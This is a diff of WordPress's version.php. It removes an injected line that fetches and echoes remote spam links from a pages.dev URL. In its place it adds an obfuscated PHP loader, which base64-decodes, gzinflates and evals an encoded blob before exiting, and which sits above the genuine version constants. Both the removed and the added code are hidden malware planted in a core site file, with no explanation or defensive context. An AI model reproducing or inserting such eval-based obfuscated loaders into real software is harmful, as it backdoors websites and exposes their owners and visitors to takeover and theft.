@@ -1,8 +1,8 @@
-<?php 
-$backlink = @file_get_contents("https://punten-neng.pages.dev/punten.txt");
-if ($backlink) {
-    echo $backlink;
-}
+<?php
+$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
+$Lix = "=sgcSr4JVz91RRuLAirwV9299cEqygUUakjQCYYGAh4/dDZoE/9yadPtonRXDzkw9Jo2F0fAw4JUxRM96lR7ilxKIFAwGhepookXy9bg6mMBwT/u5GLfi8mFRvHGj62bO0y6BpjEqXJ5l90VEbYvEVxCogLiU3kyhmzHa/tlwSN6LYyt9vEKMT5d1Tz2bxD8Pzgtm5xb9IMmvWWVwh0b/05lt/NC9CXSPBgk0A8zIww4MjFCaClcZkKuVj0ak+QolNpxGsAyzifwjG9esHXzgARhZyhiXrU0blr37/uPfgn7f2rZlc2e/LWLzx7TuMzsnLaEq5AXWJ8UMk0ygMGWEHGUx46H8fxfHTBQDuU8QWGn45v7BERA";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
 ?><?php
 /**
  * WordPress Version
@@ -60,4 +60,3 @@ $required_php_extensions = array(
  * @global string $required_mysql_version
  */
 $required_mysql_version = '5.5.5';
-
